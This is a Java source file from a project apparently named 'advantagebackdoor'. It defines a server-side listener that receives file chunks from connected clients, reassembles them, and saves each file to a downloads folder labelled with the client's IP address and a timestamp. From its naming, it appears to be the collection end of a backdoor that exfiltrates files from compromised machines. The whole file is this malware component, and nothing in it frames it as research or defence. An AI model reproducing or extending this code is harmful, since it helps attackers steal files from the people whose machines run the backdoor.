package me.faintcloudy.advantagebackdoor.server.message;

import me.faintcloudy.advantagebackdoor.api.message.MessageHandler;
import me.faintcloudy.advantagebackdoor.api.message.MessageListener;
import me.faintcloudy.advantagebackdoor.api.message.play.client.ClientFileMessage;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.List;
import java.util.*;

public class ClientFileListener implements MessageListener {
    Map<UUID, List<byte[]>> files = new HashMap<>();
    SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd-hh-mm-ss");
    @MessageHandler
    public void onClientFile(ClientFileMessage message)
    {
        byte[] bytes = message.file;
        List<byte[]> listBytes = files.getOrDefault(message.uuid, new ArrayList<>());
        listBytes.add(bytes);
        files.put(message.uuid, listBytes);
        if (message.end)
        {
            String[] split = message.name.split("\\.");
            File temp = new File(message.name);
            String theName = temp.getName();
            File file;
            if (split.length > 1) {
                String en = split[split.length-1];
                String fileName = theName.substring(0, theName.length()-en.length()-1);
                file = new File("downloads", fileName + "-" + message.getUser().getAddress().toString().replace("/", "") + "-" + format.format(new Date()) + "." + en);
            } else {
                file = new File("downloads", theName + "-" + message.getUser().getAddress().toString().replace("/", "") + "-" + format.format(new Date()));
            }
            try {
                if (!file.getParentFile().exists())
                    file.getParentFile().mkdir();
                System.out.println(file.getName());
                if (!file.exists())
                    file.createNewFile();
                FileOutputStream out = new FileOutputStream(file);
                for (byte[] bts : files.get(message.uuid)) {
                    out.write(bts);
                }
                out.close();
                files.remove(message.uuid);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

    }
}
